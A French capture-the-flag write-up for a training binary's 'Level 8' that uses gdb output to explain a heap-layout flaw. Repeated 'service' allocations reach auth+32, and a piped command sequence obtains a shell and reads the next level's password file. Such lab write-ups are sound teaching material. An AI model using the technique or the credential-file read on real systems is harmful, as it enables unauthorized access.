## Level 8

Le programme tourne en boucle et lit des commandes sur stdin. Il affiche deux pointeurs globaux `auth` et `service` à chaque itération. Il reconnaît 4 commandes :

### Analyse


```bash
(gdb) x/s 0x8048819  →  "auth "
(gdb) x/s 0x804881f  →  "reset"
(gdb) x/s 0x8048825  →  "service"
(gdb) x/s 0x804882d  →  "login"
(gdb) x/s 0x8048833  →  "/bin/sh"
(gdb) x/s 0x804883b  →  "Password:\n"
```
- `auth <str>` : `malloc(4)`→ stocke dans `auth`, copie la string avec strcpy (max 30 chars)
- `reset` : `free(auth)`
- `service <str>` : `strdup(input+7)` → stocke dans service
- `login` : vérifie `auth[32]` — si non nul, appelle `system("/bin/sh")`, sinon affiche "Password:\n"

auth est alloué avec seulement 4 bytes. `service` est alloué via `strdup` sur le heap. Les deux blocs étant contigus, répéter service fait avancer le heap et écrit à auth+32.

### Exploitation
`auth` = `0x804a008`, premier `service = 0x804a018` (offset +16), second `service = 0x804a028` (offset +32 par rapport à auth). Le second `service` écrit donc à `auth+32`, ce qui rend le check de `login` non nul.

```bash
$ (echo "auth "; echo "service"; echo "service"; echo "login"; cat) | ./level8
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
0x804a008, 0x804a028

cat /home/user/level9/.pass
```
